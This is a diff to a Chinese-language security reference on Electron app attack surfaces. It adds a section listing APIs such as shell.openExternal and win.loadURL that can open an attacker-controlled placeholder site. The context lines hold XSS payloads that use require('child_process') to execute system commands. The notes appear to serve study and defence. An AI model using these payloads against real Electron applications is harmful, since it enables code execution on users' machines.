@@ -46,6 +46,17 @@ XSS漏洞
     - ``<img src=x onerror=alert(require('child_process').execSync('gnome-calculator')); />``
     - ``<img src=x onerror=alert(require('child_process').exec('calc')); />``
 
+可控页面
+----------------------------------------
++ 调用系统浏览器打开的API
+    -  ``shell.openExternal('http://malicious.site')``
+    - 注意： ``file://`` 协议可直接进行本地文件执行
++ Electron自己打开页面的API
+    - ``win.loadURL('http://malicious.site')``
+    - ``win.webContents.loadURL('http://malicious.site')``
+    - webview/iframe标签
+    - ``window.open``
+
 IPC攻击
 ----------------------------------------
 
